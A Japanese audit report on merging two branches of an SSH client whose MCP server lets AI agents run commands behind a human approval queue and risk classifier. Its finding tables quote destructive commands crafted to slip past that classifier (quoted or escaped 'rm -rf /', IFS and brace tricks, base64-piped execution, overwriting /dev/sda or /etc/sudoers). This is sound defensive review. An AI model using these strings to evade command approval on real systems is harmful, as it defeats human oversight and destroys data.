# 監査報告書（第2回）: フェーズ2・フェーズ3 の統合前確認

## 1. 概要

| 項目 | 内容 |
|---|---|
| 対象 | フェーズ2側のツリー（以下 **P2**、マルチタブ・サイドバー・接続先編集画面・シリアル）と、フェーズ3側のツリー（以下 **P3**、MCP 充実・TOFU・エージェント専用トークン） |
| 前回 | `docs/spec/audit-a6f2706.md`（a6f2706、確定 58件） |
| 前回分の判定基準 | マージ後に直っているとみなせるのは、P2・P3 のどちらか一方で fixed のもの。ただしマージで修正側のコードが失われる（退行する）おそれがあるものは注記した |
| 新規の確定基準 | 検証者3人のうち2人以上が反証できなかったもの |

### 1.1 前回 58件の消化状況

| 区分 | 件数 | 番号 |
|---|---|---|
| 両側とも remaining（マージしても残る） | **29** | #1, #3, #4, #5, #6, #7, #9, #10, #12, #14, #21, #23, #28, #29, #33, #34, #35, #36, #37, #41, #42, #46, #47, #48, #49, #51, #55, #56, #57 |
| P2 だけ fixed（マージで P2 側を採用すれば解消） | 14 | #20, #22, #24, #25, #26, #27, #38, #39, #40, #43, #44, #45, #53, #54 |
| P3 だけ fixed（マージで P3 側を採用すれば解消） | 14 | #2, #8, #11, #13, #15, #16, #17, #18, #30, #31, #32, #50, #52, #58 |
| 両側とも fixed | 1 | #19（実装が両側で異なる。§4 参照） |

前回の critical 2件（#22, #40、グループ A）は P2 でのみ直っており、P3 の `frontend/src/main.js` には元の欠陥が残っています。マージで P3 の承認画面が残ると critical が復活します。

### 1.2 新規の確定指摘

| 重要度 | 件数 | 番号 |
|---|---|---|
| critical | 2 | N15, N16 |
| major | 12 | N1, N2, N5, N6, N11, N17, N18, N19, N25, N26, N29, N31 |
| minor | 17 | N3, N4, N7, N8, N9, N10, N12, N13, N14, N20, N21, N22, N23, N24, N27, N28, N30 |
| 合計 | 31 | P2 側 15件 / P3 側 16件 |

新規の番号は前回の番号と区別するため `N` を付けています。

新規の中の重複・関連:

| グループ | 番号 | 内容 |
|---|---|---|
| α | N18, N31 | 未知ホストが証明書を出すと TOFU が働かず、永久に接続できない（同一の欠陥） |
| β | N5, N25 | 非同期処理の完了や言語切替で、承認画面・設定画面の編集が消える（N25 は言語切替に絞った再現） |
| γ | N15, N16, N17, N29, N30 | P3 の新しい riskWords / classifyRisk のすり抜け（前回グループ E: #5, #28, #48 の修正が不完全） |
| δ | N2, N3, N4, N23 | 切断・削除・終了で、実行中のコマンドが止まらない、または止まったように見える |

---

## 2. 前回分の消化状況

列の意味: **P2** / **P3** は各ツリーでの判定、**マージ後** は統合したときの見込み。重要度は前回の判定のまま。両側とも remaining のものを先に、その後に片側 fixed のものを置いた。

### 2.1 両側とも remaining（29件）

| # | 重要度 | P2 | P3 | マージ後 | 根拠 |
|---|---|---|---|---|---|
| 1 | major | remaining | remaining | 未解消 | sanitizeMCPSettings は空のパスを埋めるだけ（P2 app.go:1341-1360 / P3 app.go:1449-1468）。validateListenSettings と SaveMCPSettings（P2 app.go:937-941 / P3 app.go:741-745）はパスを検査せず保存する。newMCPHandler はそのまま mux.HandleFunc に渡し recover もない（P2 httpguard.go:232-240 / P3 httpguard.go:234-242）。fillConnectURLs の先頭スラッシュ補正（httpguard.go:154）は表示 URL にしか効かない |
| 3 | major | remaining | remaining | 未解消 | 起動時に NewApp が無条件に recoverInterruptedRequests を呼ぶ（P2 app.go:320 / P3 app.go:340）。他インスタンスを確かめずに `UPDATE ... WHERE status IN (running, auto_running)`（P2 storage.go:320-324 / P3 storage.go:411-415）。flock も Wails の SingleInstanceLock もなく、sql.Open は busy_timeout/foreign_keys だけ（P2 storage.go:59 / P3 storage.go:62） |
| 4 | minor | remaining | remaining | 一部解消（競合は P3 で解消、物理削除は残る） | P2: approval.go:241-265 がロックなしのスナップショットで状態を見て、storage.go:544 で無条件 DELETE。P3: approval.go:482 で a.mu を保持し、storage.go:645 deleteCommandRequestUnlessRunning が `status NOT IN (running, auto_running)` の CAS 削除。ただし実行済み（succeeded/failed/auto_*）の記録は deleted_at もなく物理削除され、拒否もされない |
| 5 | major | remaining | remaining | 未解消（P3 で一部改善、一部退行） | P2: mcp_server.go:601 の部分文字列一致のまま。前回の 9 ペイロードがすべて Low。P3: mcp_server.go:938 classifyRisk と riskWords が区切り・クォートで分割し、`ls;rm`、改行+rm、`&&rm`、`"rm"`、空白2つの systemctl は High に（TestClassifyRiskSeesChainedAndPathCommands）。しかし `r''m -rf /`、`rm${IFS}-rf${IFS}/`、`$(echo ...\|base64 -d)` は Low のまま。`\rm -rf /` と `r\m -rf /` も Low（`\rm` は P2 では High だったので P3 の退行）。解析不能な入力を Unknown / キュー強制にする区分はなく、needsHumanApproval（approval.go:523）は High だけを強制扱いする。新規 N15/N16/N30 参照 |
| 6 | minor | remaining | remaining | 未解消 | containsWord は両側とも変わらず（P2 approval.go:300 / P3 approval.go:548）、フィールド単位の完全一致。`/usr/bin/sudo cat /etc/shadow` は両側で containsWord=false, risk=Medium。`"sudo" id` は P2 で Low、P3 で Medium、いずれも containsWord=false。Medium は既定の bypass max_risk（Medium）の範囲内なので、WriteOp を切ると承認なしで実行される。RequireApprovalSudo の判定は P2 approval.go:286 / P3 approval.go:534 |
| 7 | major | remaining | remaining | 未解消 | P2: ssh_exec.go は a6f2706 から変更なし。ssh_exec.go:85 の NewSession は :183 でデッドラインを外した後、:104 の ctx select より前に走る。P3: 同じ構造（NewSession :87、デッドライン解除 :194）。handshakeDone ゴルーチンはハンドシェイク中だけ ctx を見る（:178-185）ので、チャネルを開いている間は ctx でクライアントが閉じられない |
| 9 | minor | remaining | remaining | 未解消 | 両側とも ssh_exec.go:294 が `return os.ExpandEnv(expandWindowsEnv(path))`。probe で expandPath("/Users/u/keys/id$prod") が "/Users/u/keys/id" を返す |
| 10 | major | remaining | remaining | 未解消 | migrateLegacyData は `store.prevVersion >= 2` で早期 return のまま（P2 app.go:1226-1229 / P3 app.go:1334-1356）。insertConnection の失敗（P2 :1241）はログに出るだけで storageError は立たない（P2 app.go:317-319 / P3 :337-339）。user_version は migrate() が先に確定する（storage.go:254）。TestLegacyJSONImportedOnlyOnce は失敗後の再試行を見ていない |
| 12 | minor | remaining | remaining | 未解消 | P2: storage.go:151 VACUUM INTO の後に :154 で os.Chmod(backup, 0600)、エラーは無視。P3: backupBeforeMigration（storage.go:99-115）は tmp に書いて rename するようになったが、VACUUM INTO tmp（:105）の後に Chmod（:109）なのは同じで、エラーも無視。umask の変更も O_EXCL 0600 での事前作成もなく、0644 の窓が残る。MkdirAll(0700)（storage.go:50）は既存ディレクトリを締めない |
| 14 | minor | remaining | remaining | 未解消 | P2 app.go:1427-1435 / P3 app.go:1535-1543 は同じコード。8文字以下だけ全マスクし、それより長いと先頭4文字と末尾4文字を出す。9文字の `hunter2pw` は 9文字中8文字が見える。maskToken のテストは両側ともない |
| 21 | minor | remaining | remaining | 未解消 | DeleteMCPSettings（P2 app.go:990 / P3 app.go:794）は a.mu の外で先に stopMCPServer を呼び、その後 a.mcp を無効化する。SaveMCPSettings（P2 app.go:918 / P3 app.go:722）と GenerateMCPToken（P2 app.go:959 / P3 app.go:763）は a.mu を放してから restartMCPServer を呼ぶ。lifecycleMu は stop と start を個別に直列化するだけなので、Delete.stop → Save.restart（旧設定）→ Delete が a.mcp を書く、の順で設定は停止なのにリスナーが残る |
| 23 | minor | remaining | remaining | 未解消 | appConfigDir（P2 app.go:1182-1193 / P3 app.go:1290-1301）は UserConfigDir と UserHomeDir が両方失敗すると `os.TempDir()/appName` に落ちる。openStore（P2 storage.go:46-60 / P3 storage.go:49-63）は既存ディレクトリの所有者・パーミッションを確かめず、既存の DB をそのまま開く（Lstat/uid の確認なし） |
| 28 | major | remaining | remaining | 未解消 | P2: mcp_server.go:601 のまま。`"rm" -rf /tmp/x`、`r\m -rf /tmp/x`、`systemctl  restart nginx` が Low。P3: riskWords（:989）がクォートと空白で分割するので `"rm" -rf` と空白2つの systemctl は High に。しかしバックスラッシュを除去しない（riskWords :1021-1030）ため `r\m -rf /tmp/x` は Low のままで、bypass では自動実行される。テストにバックスラッシュのケースがない |
| 29 | major | remaining | remaining | 未解消 | P2: containsWord（approval.go:286/300）が完全一致。`"sudo" id` は Low かつ containsWord=false で、既定設定で自動実行。P3: riskWords がクォートを外すので `"sudo" id` は Medium になり、既定の RequireApprovalWriteOp でキューに入る。しかし containsWord（approval.go:534,548）は変わらず、`"sudo" id` と `/usr/bin/sudo id` で sudoword=false。`\sudo id` と `s\udo id` は Low かつ sudoword=false なので既定設定でも自動実行。RequireApprovalWriteOp=false で sudo 規則だけを確かめるテストはまだない（TestBypassPolicyLimits mcp_server_test.go:479） |
| 33 | major | remaining | remaining | 未解消 | P2: ssh_exec.go は a6f2706 から変更なし。P3: ssh_exec.go:176-184 はデッドラインと ctx.Done による close を netConn にしか掛けない。dialAgentClient（:271-277）の agent 接続にはデッドラインがなく、先に呼ぶ agentClient.Signers()（:248）も無期限。前回の agenthang テストを両側のスクラッチコピーで再実行し（P3 は testSSHConnection、HOME/SSH_GETE_CONFIG_DIR を隔離）、ctx=2s・ConnectTimeout=1 で 8秒後も両方ブロックしたまま |
| 34 | major | remaining | remaining | 未解消 | P2: storage.go:50 `fresh := !fileExists`、app.go:1232 `importData := store.fresh` のまま。P3: storage.go:53-60 も事前にファイルを作り、存在で fresh を決める。migrateLegacyData（app.go:1340-1369）は importData=false でも JSON を *.migrated に改名する。前回の TestAuditFreshEmptyFile を両側で実行し、fresh=false prev=0 conns=0 jsonExists=false migratedExists=true |
| 35 | minor | remaining | remaining | 未解消（P2 で形を変えて残る） | P2: frontend/src/editor.js:1304 が同じ正規表現 `/^(~\|\/\|[A-Za-z]:\\\|%)/` で判定し、`/` で始まるパスワードは鍵へ切り替えても残る。keyPathCol（:729）は type=text なので平文で見える。P3: frontend/src/main.js:2177 が元のまま。新規 N7 参照 |
| 36 | minor | remaining | remaining | 未解消 | TestConnectionConfig（P2 app.go:697-700 / P3 app.go:499-502）と SaveConnection（P2 app.go:860-861 / P3 app.go:665-666）が host/port/user を照合せずに保存済み Credential を埋める |
| 37 | minor | remaining | remaining | 未解消 | finishRequest は保存エラーを log.Printf するだけ（P2 approval.go:216 / P3 approval.go:453-454）。transitionRequest（P2 :85-87 / P3 :186-188）は古い記録を返し、メモリを更新しない。P3 の runBypassedCommand（mcp_server.go:488）は auto_running の final を isError なしで返す |
| 41 | minor | remaining | remaining | 未解消 | どちらも Windows ACL を設定しない（*_windows.go は ssh_agent_windows.go だけ）。保護は MkdirAll 0o700・OpenFile 0o600・Chmod 0o600 だけ。P2 storage.go:47,53,78,154 と app.go:1261、P3 storage.go:50,56,81,109 と app.go:1369 |
| 42 | minor | remaining | remaining | 未解消 | 両側同一。ssh_agent_windows.go:24 が大文字小文字を区別する `strings.HasPrefix(pipe, `\\.\pipe\`)`。`//./pipe/x` や `\\?\pipe\x` は黙って openssh-ssh-agent に落ちる。正規化もログもない |
| 46 | major | remaining | remaining | 未解消 | TestBypassPolicyLimits の sudo の検証は変わらず（P2 mcp_server_test.go:458 / P3 :501）。両側のスクラッチコピーで sudo 規則を無効化（`if false && settings.RequireApprovalSudo...`、P2 approval.go:283 / P3 approval.go:534）しても `go test .` は全部通る。WriteOp=false・Sudo=true のテストがない。P3 でも `s\udo id` は Low かつ containsWord=false でキューに入らない |
| 47 | minor | remaining | remaining | 未解消 | legacyStatusCodes は「承認待ち」を statePending に写したまま（P2 storage.go:212 / P3 storage.go:263）。migrateToV2 に実行痕跡のある行を interrupted にする処理がない。recoverInterruptedRequests は running と auto_running だけを見る（P2 storage.go:320-323 / P3 storage.go:411-414）。P3 は pending の期限切れを追加したが、app.go:396-403 が expires_at のない旧 pending 行に起動時から新たに 24時間を与えるので、アップグレード後も承認できる |
| 48 | major | remaining | remaining | 未解消（P3 で一部改善） | P2: mcp_server.go:601 のまま。指摘の 8 コマンド（dd of= if=、systemctl poweroff、poweroff、空白2つの systemctl stop、systemctl disable --now、shred、crontab -r、find -delete）がすべて Low。P3: mcp_server.go:938 がトークン化し、poweroff・shred・find -delete・空白2つ・systemctl poweroff は High に。`dd of=/dev/sda if=/dev/zero`（' dd if=' の並びしか見ない）、`systemctl disable --now sshd`、`crontab -r` は Low のまま。新規 N17 参照 |
| 49 | major | remaining | remaining | 未解消 | WriteOp は `risk != "Low"` のまま（P2 approval.go:280 / P3 approval.go:531）。どちらの classifyRisk もリダイレクト・tee・cp・chmod・chown を検出しない。`echo 'ssh-ed25519..' >> authorized_keys`、`cp /tmp/x /etc/sudoers`、`chmod 777 /etc/shadow`、`tee /etc/hosts` が両側で Low。P3 の riskWords は `>` を区切りとして捨てる |
| 51 | minor | remaining | remaining | 未解消 | id が空のときだけ 202 を返す。id があり method がない本文は 400/-32600（P2 mcp_server.go:116-123 / P3 mcp_server.go:141-151）。スクラッチのテスト TestAudit51ClientResponse で `{"id":1,"result":{}}` と `{"id":2,"error":{...}}` が両側とも 400 "invalid request" |
| 55 | major | remaining | remaining | 未解消 | P2: approval.go:280 を `if false && risk == "High"` にしても `go test ./...` は全部通る。P3: approval.go:524 の High 判定と storage.go:669 policyAllows の `risk == "High"` を消しても全部通る。不変条件は max_risk の上限（storage.go:673）だけで保たれており、それも外して初めて TestPolicyAllows（'high never'、storage_test.go:313）が落ちる。RequireApprovalWriteOp=false を設定するテストがなく、TestBypassQueuesChainedHighRisk（mcp_server_test.go:1346）と TestBypassPolicyLimits（:479）は WriteOp=true だから通っているだけ。求めた E2E テスト（WriteOp オフで High が pending に残る）はない |
| 56 | minor | remaining | remaining | 未解消 | ガードは P2 approval.go:123-126 / P3 approval.go:302-305。どちらの *_test.go にも risk_increased も allowRiskIncrease も出てこない。修正後のコマンド（空でない第2引数）を渡す Approve* 呼び出しがテストに 1件もなく、すべて `ApproveCommand(id, "")` の形 |
| 57 | minor | remaining | remaining | 未解消 | ForceQueue の使用は P2 mcp_server.go:61/329、P3 mcp_server.go:84/425/433。両側ともテストの .go/.js に force_queue / ForceQueue が出てこない。バイパスのテスト（P2 TestBypassPolicyLimits mcp_server_test.go:431、P3 storage_test.go の policy 系）は force_queue を見ていない |

### 2.2 片側だけ fixed、または両側 fixed（29件）

| # | 重要度 | P2 | P3 | マージ後 | 根拠 |
|---|---|---|---|---|---|
| 22 | critical | fixed | remaining | 解消（P2 の承認画面を採用した場合のみ） | P2: approvalTarget()（frontend/src/main.js:442-447）が textarea の data-request-id（:554）と選択中の要求が一致し、まだ pending かを確かめる。承認・承認+省略・拒否（:928/949/994）は不一致なら refuseStaleApproval で止まる。renderCommands が描いた要求に selectedRequestId を固定する（:473）ので copy-command も A を対象にする。フロントのテストはない（コード読みのみ）。P3: main.js:1061-1066 は最初の pending にフォールバックしたまま。textarea（:1153）に data-request-id がなく、:2001/2017/2056 のハンドラは検証なしで selectedCommandRequest().id を送る。refreshData の protectApproval（:712）は render を呼ばない。バックエンドの target_changed は B 自身の実行先が変わっていないので止めない |
| 40 | critical | fixed | remaining | 解消（P2 採用時のみ） | #22 と同じ欠陥（グループ A）。P2: renderCommands（main.js:473）がフォールバックで描いた要求の id を selectedRequestId に入れ、approvalTarget（:442）が data-request-id と照合するので、A の編集が B.id で送られない。P3: main.js:1068-1072 は選択を固定せず、approve-command（:2001-2006）が textarea の値と再計算した selectedCommandRequest() の id を組み合わせる。A の編集済みコマンドが B.id で承認され、B のホストで実行される |
| 53 | major | fixed | remaining | 解消（P2 採用時のみ） | P2: 選択の固定（main.js:473）、data-request-id（:554）、approvalTarget（:442）による照合と、承認・承認+省略・拒否（:930,:950,:996）での拒否。テスト main.test.js:282「新しい要求が先に来ても、フォームを編集した要求を承認する」。P3: main.js:1063 は保存せずにフォールバックし、renderCommands（:1067）は選択を固定せず、textarea（:1153）に request-id がない。:2002,:2018,:2057 が textarea のコマンドを selectedRequest.id で送る |
| 20 | minor | fixed | remaining | 解消（P2 のターミナル実装を採用した場合） | P2: StartTerminal はダイヤル前に status=connecting の仮エントリを a.terms に登録する（terminal.go:296-316）。DeleteConnection（app.go:901）から呼ばれる closeTerminalsForConnection（terminal.go:724）は connecting も拾い、closeTerminalSession（:624-636）が reason=user を立てて ctx を cancel。commitTerminal（:385-389）は reason=user なら確立を拒む。テスト TestCloseWhileConnecting / TestCloseTerminalsByConnection。connectionByID から登録までのネットワーク I/O のないごく短い区間が、Delete の closeTerminals と conns 除去の間に重なる余地は理論上残る。P3: startSSHSession（terminal.go:85-160）は確立後に setTerminalSession で a.term を設定し、closeTerminalsForConnection（:289）はダイヤル中を知らない |
| 39 | minor | fixed | remaining | 解消（P2 採用時） | #20 と同じ（グループ H）。P2: terminal.go:297-317 の仮登録、:724-737 と :624-635 の cancel、:385-389 の再確認。TestCloseWhileConnecting、TestCloseTerminalsByConnection、TestDisconnectClosesTabsAndCancelsExec がスクラッチで通る。P3: 単一の a.term のまま。Shell() の後に無条件で setTerminalSession（terminal.go:146）、closeTerminalsForConnection は a.term しか見ない（:289-302） |
| 38 | major | fixed | remaining | 一部解消（入力は P2 採用で解消、リサイズは残る） | P2: terminal-tabs.js:354-390 の queueInput/flushInput が sendQueue に連鎖し、SendTerminalInput を同時に 1つだけ待つ。バックエンドは pumpTerminalInput（terminal.go:545-568）が stdin の唯一の書き手。テスト terminal-tabs.test.js 'send queue is serial and ordered'、terminal_test.go TestInputOrder。ResizeTerminal は打ちっぱなし（terminal-tabs.js:227）でバックエンドも直列化しない（terminal.go:663-683）ので、リサイズ部分は未解消（新規 N22）。P3: terminal.go と main.js は a6f2706 から変更なし。SendTerminalInput（terminal.go:232）を main.js:1318 が await なしで呼ぶ |
| 24 | major | fixed | remaining | 解消（P2 の .github を採用した場合） | P2: release.yml:23-24 でトップレベルを contents: read、build ジョブも read（:36-37）、release ジョブだけ contents: write（:117-118）、checkout は persist-credentials: false（:55）。P3: release.yml:13-14 がワークフロー全体に contents: write、checkout@v4（:31）に persist-credentials の指定なし |
| 44 | major | fixed | remaining | 解消（P2 採用時） | P2: build ジョブは contents: read（:36-37）、checkout は persist-credentials: false（:53-55）、`npm ci --ignore-scripts`（:80-82）、`wails build -s`（:90）で frontend:install = npm install（wails.json:5）を飛ばす。P3: a6f2706 から変更なし |
| 25 | major | fixed | remaining | 解消（P2 採用時） | P2: release.yml:69-71 が go.mod の版（v2.12.0）を読み `go install wails@${WAILS_VERSION}`。すべての uses: がフル SHA で固定（release.yml:53,58,63,105,121,132、test.yml:28,31,55,58,61）。P3: release.yml:44 が wails@latest、action はタグ参照（:31-79） |
| 43 | major | fixed | remaining | 解消（P2 採用時） | P2: release.yml:132 で softprops/action-gh-release を SHA（v2.6.2）に固定、他の uses: も SHA 固定。既定権限は read、release ジョブだけ write。.github/dependabot.yml を追加。P3: .github は a6f2706 から変更なし（release.yml:79 が @v2、全体 contents: write） |
| 26 | minor | fixed | remaining | 解消（P2 採用時） | P2: test.yml:16 で GOVULNCHECK_VERSION=v1.9.0 固定、:21-26 の ubuntu/macos/windows マトリクスで :43-47 の govulncheck をネイティブ実行。P3: test.yml:31-41 は ubuntu-latest だけで `govulncheck@latest` |
| 45 | minor | fixed | remaining | 解消（P2 採用時） | #26 と同じ（グループ K）。P2: test.yml:25,40-47。P3: 別ジョブで ubuntu-latest のみ、@latest（test.yml:31-41） |
| 27 | minor | fixed | remaining | 解消（P2 採用時） | P2: release.yml の test ジョブが `uses: ./.github/workflows/test.yml`、build に `needs: test`。P3: jobs は build だけで needs もテストもない |
| 54 | minor | fixed | remaining | 解消（P2 の lockfile と CI を採用した場合） | P2: test.yml:83-85 `npm audit --audit-level=high`（continue-on-error なし）、dependabot.yml あり、package-lock.json:1516-1517 で vite 8.3.5、`npm audit --package-lock-only` で 0件。P3: audit ステップなし、dependabot.yml なし、package-lock.json:836-837 で vite 8.0.16、high 4件（GHSA-rq7h-c2jc-7f22 ほか） |
| 2 | major | remaining | fixed | 解消（P3 の approval.go を採用した場合） | P2: approval.go:139-141 が connectionByID の失敗時に findConnection(req.Host) にフォールバックしたまま。P3: resolveRequestTarget（approval.go:199-212）は connection_id があれば ID だけで引き、削除済みなら not-found（:370 で failed）。user@host:port が変わっていれば :312-317 で target_changed。store.deleteConnection（storage.go:497）は connection_id を消さない。TestApprovalTargetShowsResolvedConnectionAndFPChange（mcp_server_test.go:1209-1234）が通る |
| 11 | major | remaining | fixed | 解消（P3 採用時） | グループ B。P2: approval.go:139-141 のフォールバックと :149-151 の ConnectionID/Host 上書き。P3: resolveRequestTarget が ID ありなら名前フォールバックなしで失敗、approve は :305 で使い、:308 で TargetFP 確認。テストは -race で通る |
| 31 | major | remaining | fixed | 解消（P3 採用時） | グループ B。P2: approval.go:139-142、:150-153 のまま。P3: resolveRequestTarget（approval.go:200）は ID ありなら not found、名前で引くのは ID のない旧行だけで、その場合も TargetFP 確認（:311）で target_changed。mcp_server_test.go:1167,1209 が通る。ただし旧行の TargetFP が空の問題は新規 N21 |
| 13 | minor | remaining | fixed | 解消（P3 採用時） | グループ C。P2: approval.go:241-251 でロックなしに状態を見て、storage.go:545 で無条件 DELETE。P3: approval.go:482-512 で a.mu を保持したまま deleteCommandRequestUnlessRunning。storage.go:646 が条件付き DELETE で、RowsAffected=0 なら errStateConflict。TestDeleteRefusesRunningRequest（mcp_server_test.go:1486） |
| 18 | major | remaining | fixed | 解消（P3 採用時） | グループ C。P2: approval.go:241-266 は findRequest（RLock）を放してから状態を見て無条件 store.deleteCommandRequest。フェーズ2の差分はこの部分に触れていない。P3: approval.go:482-516 が a.mu.Lock 内で確認・DB 削除・メモリ削除。storage.go:645 の条件付き DELETE と RowsAffected 確認。TestDeleteRefusesRunningRequest が通る |
| 15 | major | remaining | fixed | 解消（P3 採用時） | グループ D。P2: mcp_server.go は a6f2706 から変更なし、:305 の findRequestByClientID（approval.go:417、RLock を取って放す）による check-then-act のまま。P3: mcp_server.go:398-404 が mcpRuntime.lockKey(agent+\x00+key)（mcp_status.go:115、参照カウント+sync.Once）を取り、検索から記録までを保持。キュー経路は queueCommand が返るまで defer で保持、bypass 経路は recordCommandRequest の後（:463）で解放。TestConcurrentClientRequestIDRunsOnce と TestClientRequestIDIsIdempotent が -race で通る。インデックスは非 UNIQUE（storage.go:248）なので DB 側の最後の防御はない。認証を鍵に含めない点は新規 N14 |
| 17 | major | remaining | fixed | 解消（P3 採用時） | グループ D。P2: mcp_server.go:305 にロックなし。P3: mcp_server.go:398-404 / mcp_status.go:115-140 のキー単位 mutex。TestConcurrentClientRequestIDRunsOnce（mcp_server_test.go:1364）が -race -count=1 で通る |
| 30 | minor | remaining | fixed | 解消（P3 採用時） | グループ D。P2: 逐次の TestClientRequestIDIsIdempotent（mcp_server_test.go:491）だけ。P3: キーをロックしてから記録し（unlockKey）、並行テスト TestConcurrentClientRequestIDRunsOnce を追加。-race で ok |
| 16 | minor | remaining | fixed | 解消（P3 採用時） | P2: findRequestByClientID（approval.go:417-433）はメモリの a.requests だけを探し、起動時は loadCommandRequests(500)（app.go:357）。P3: existingClientRequest（mcp_status.go:223-237）がメモリになければ store.loadRequestByClientID（storage.go:1003-1022）で SQLite を引く（requested_by, client_request_id, created_at>=24時間前）。idx_command_requests_client（storage.go:248）と TestLoadRequestByClientID（storage_test.go:460） |
| 32 | major | remaining | fixed | 解消（P3 採用時） | グループ G。P2: approval.go:272-279 が現在の GetMCPSettings().BypassAllowed で判定し、handleMCP（mcp_server.go:89）はリスナーのスナップショットで Bearer を確かめる。GenerateMCPToken（app.go:975-980）は restartMCPServer の前に a.mcp を書く。P3: authenticateMCP（app.go:1096-1108）が認証時に呼び出し元を確定し、未認証は mcpCaller{}。needsHumanApproval（approval.go:523-525）は caller.mayBypassAs(agentName) を要求し、それにはエージェント専用トークンが要る（app.go:233-235）。共有トークンは該当しない。テスト TestBypassRequiresBearer、TestSharedTokenCannotClaimBypass、TestListenerRestartDetachesBypassedRun。トークン更新後の扱いは新規 N28 |
| 52 | major | remaining | fixed | 解消（P3 採用時） | グループ G。P2: mcp_server.go:89 がリスナーの設定とトークンで認証し、needsHumanApproval（approval.go:272-278）は agentApprovalBypassEnabled と GetMCPSettings().BypassAllowed で現在の a.mcp を読み直す。P3: handleMCP が authenticateMCP（app.go:1096）を 1回呼んで mcpCaller を確定し、needsHumanApproval（approval.go:524）はその要求で提示された専用トークンによる mayBypassAs のときだけ省略する。Bearer オフの匿名要求は Agent="" で常にキュー。TestBypassRequiresBearer（:460）、TestSharedTokenCannotClaimBypass（:737） |
| 8 | minor | remaining | fixed | 解消（P3 の hostkey.go を採用した場合） | P2: ssh_exec.go:151-156 の ClientConfig に HostKeyAlgorithms なし、hostkey.go なし。P3: ssh_exec.go:156-166 が newHostKeyVerifier から HostKeyAlgorithms を設定し、hostkey.go:198 hostKeyAlgorithmsFor が known_hosts の鍵種別に絞る（RSA には rsa-sha2-512/256 も）。@cert-authority はライブラリ既定に戻す（hostkey.go:233）。TestHostKeyAlgorithmsFollowWant、TestHostKeyAlgorithmsForRSA（hostkey_test.go:127,163）。既定に戻す経路の問題は新規 N18/N31 |
| 50 | major | remaining | fixed | 解消（P3 の storage.go を採用した場合） | P2: storage.go:148-156 のまま、`if !fileExists(backup)` で VACUUM INTO と Chmod を飛ばす。P3: backupBeforeMigration（storage.go:99-115）が .tmp-N に VACUUM INTO、0600 に chmod、rename。既存の .bak-vN は信用せず、新しいコピーはタイムスタンプ付きの名前。TestMigrationBackupNotSkippedByExistingFile（storage_test.go:154）。integrity_check はなく、クラッシュすると 0644 の .tmp が残りうる |
| 58 | minor | remaining | fixed | 解消（P3 採用時） | P2: approval.go:207-211 が終了コード以外のエラーで Stderr に "\n"+execErr.Error() を足すので、mcp_server.go:384 の strings.HasSuffix(req.Stderr, marker) が false。P3: mcp_server.go:568 が strings.Contains に変わり、approval.go:444-449 が後ろに execErrorMarker+err を足しても検出できる。タイムアウトと切り詰めが同時に起きるテストは P3 にもない |
| 19 | major | fixed | fixed | 解消（ただし実装を一方に揃える必要あり） | P2: shutdown（app.go:395）が appCancel → cancelExecs(errShuttingDown) → stopMCPServer → waitExecs(grace)（app.go:410、WaitGroup と running/auto_running がなくなるまでの待機）→ store.Close。approve は executeSSH(a.appCtx) → trackExec で追跡（approval.go:175,346）。TestShutdownInterruptsRunning、TestShutdownInterruptsMCPExec。grace を過ぎると中断の保存を待たずに返り、また待つ前にすぐ cancel する（新規 N24）。P3: app.go:434 が stopMCPServer → drainMCPCommands（mcp_status.go:146、grace まで待ち、残りを cancel し、<-done を待つ）→ CloseTerminal → appCancel/wg.Wait → store.Close。approve は acquireApproved（approval.go:333）で登録し finishRequest の後に解放。TestShutdownDrainsGUIApprovedRun |

---

## 3. 新規の確定指摘

### 3.1 一覧（重要度順）

| # | 重要度 | 側 | 観点 | 場所 | 要旨 |
|---|---|---|---|---|---|
| N15 | critical | P3 | p3-risk | mcp_server.go:1023 | riskWords がクォートを単語の区切りにするので、`r''m` / `"r"m` / `\rm` が Low になり承認なしで実行される |
| N16 | critical | P3 | p3-risk | mcp_server.go:938 | 変数展開・eval・base64\|sh・curl\|sh・python -c などの間接実行をまったく見ておらず、破壊的コマンドが Low で自動実行される |
| N1 | major | P2 | p2-terminal | terminal.go:553 | シリアルのタブを閉じた後も pump が閉じた fd に書き、再利用された fd（ソケットや DB ファイル）にキー入力が書き込まれる |
| N2 | major | P2 | p2-app | approval.go:143 | running への遷移と trackExec の間に来た切断が何も止めず「実行中 0件」と報告し、コマンドはそのまま実行される |
| N5 | major | P2 | p2-frontend-state | frontend/src/editor.js:821 | renderAfterAction が pageIsBusy() を無視して再描画し、承認画面・設定画面の未保存の編集を元に戻す |
| N6 | major | P2 | p2-frontend-state | frontend/src/terminal-tabs.js:383 | input_timeout で入力の一部を捨てたままタブが入力を受け続け、途中の欠けた行が実行される |
| N11 | major | P3 | p3-mcp | mcp_server.go:426 | 承認待ちに入る通常経路で timeout_seconds が捨てられる |
| N17 | major | P3 | p3-risk | mcp_server.go:946 | highPhrases が固定の並びだけを見るので、オプションの順序を変えるだけで dd / systemctl / chmod -R が Low になる |
| N18 | major | P3 | p3-hostkey | hostkey.go:237 | 未知ホストが証明書を出すと TOFU が働かず、永久に接続できない（グループ α） |
| N19 | major | P3 | p3-hostkey | app.go:1205 | ResetHostKey / GetHostKeyInfo を呼ぶ UI がなく、正当な鍵変更から GUI で復旧できない |
| N25 | major | P2 | p2-frontend-state | frontend/src/main.js:80 | 言語切替で承認・設定の編集が元に戻るのに dirty は立ったままで、承認すると元のコマンドが送られる（グループ β） |
| N26 | major | P2 | p2-frontend-xss | frontend/src/main.js:554 | bidi 制御文字などの不可視文字を表示も拒否もせず、承認者が見るコマンドと実行されるコマンドが食い違う |
| N29 | major | P3 | p3-risk | mcp_server.go:1025 | `{rm,-rf,/x}` のブレース展開が basename 化で "x" だけになり Low になる |
| N31 | major | P3 | p3-hostkey | hostkey.go:232 | N18 と同一（既知鍵なしで HostKeyAlgorithms が nil になり、証明書ホストに永久に接続できない） |
| N3 | minor | P2 | p2-app | ssh_exec.go:99 | NewSession と session.Run の間で ctx を確かめず、キャンセル後にリモートでコマンドが始まる |
| N4 | minor | P2 | p2-app | frontend/src/editor.js:584 | タブがなく実行中コマンドだけある接続では切断ボタンが押せない |
| N7 | minor | P2 | p2-frontend-state | frontend/src/editor.js:1305 | 認証方式切替の looksLikePath が前方一致の正規表現で、パスワードが鍵パス欄に、鍵パスがパスワードに移る（#35 修正の取りこぼし） |
| N8 | minor | P2 | p2-frontend-state | frontend/src/main.js:934 | ApproveCommand の前に dirty.approval を下げるので、risk_increased で取り消すと編集が消える |
| N9 | minor | P2 | p2-frontend-xss | frontend/src/main.js:343 | ターミナル画面は常に busy でないので、ポーリングでタブ列が描き直されフォーカスや select の変更が失われる |
